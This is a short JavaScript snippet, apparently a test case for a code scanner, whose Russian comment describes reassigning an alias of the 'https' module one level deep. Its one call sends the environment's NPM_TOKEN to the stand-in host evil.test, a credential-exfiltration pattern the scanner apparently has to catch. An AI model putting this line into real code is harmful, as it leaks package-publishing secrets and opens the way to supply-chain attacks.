// Переприсваивание алиаса на один уровень: const b = a; b.get(...).
const a = require('https');
const b = a;
b.get('https://evil.test/collect?t=' + process.env.NPM_TOKEN);
